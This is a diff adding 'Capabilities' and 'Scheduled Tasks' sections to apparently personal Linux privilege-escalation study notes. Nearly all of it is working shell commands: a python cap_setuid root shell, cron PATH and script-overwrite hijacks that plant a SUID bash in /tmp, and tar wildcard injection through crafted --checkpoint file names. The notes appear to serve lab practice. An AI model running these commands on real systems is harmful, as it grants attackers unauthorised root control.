@@ -322,7 +322,87 @@ export -f /usr/sbin/service
 
 ## Capabilities
 
+```shell
+getcap -r / 2>/dev/null
+#get capabilities
+#/usr/bin/python2.6 = cap_setuid+ep
+
+#get exploit from GTFObins
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+#running this gives root
+```
+
 ## Scheduled Tasks
+
+```shell
+#cron paths
+
+cat /etc/crontab
+#view cronjobs
+#check PATH variable
+#check the directories for files of cronjobs
+
+ls -la /home/user
+#does not contain overwrite.sh
+#so we can create it
+
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+
+chmod +x /home/user/overwrite.sh
+#wait for a minute for cronjob to run
+
+/tmp/bash -p
+#we are root now
+```
+
+```shell
+#cron wildcards
+
+cat /etc/crontab
+#this runs a script every minute
+
+cat /usr/local/bin/compress.sh
+#this runs a tar command which uses wildcards
+#we can exploit the tar wildcard cronjob
+
+ls -la /usr/local/bin/compress.sh
+#we cannot modify the script
+
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
+
+chmod +x runme.sh
+
+#get exploit from Google
+touch /home/user/--checkpoint=1
+
+touch /home/user/--checkpoint-action=exec=sh\runme.sh
+#wildcard injection
+#wait for a minute
+
+/tmp/bash -p
+#we get root
+```
+
+```shell
+#cron file overwrites
+
+cat /etc/crontab
+#mentions overwrite.sh
+
+locate overwrite.sh
+
+ls -la /usr/local/bin/overwrite.sh
+#we have write permissions
+
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+
+#wait a minute
+ls -la /tmp
+#cronjob runs
+
+/tmp/bash -p
+#we get root
+```
 
 ## NFS Root Squashing
 
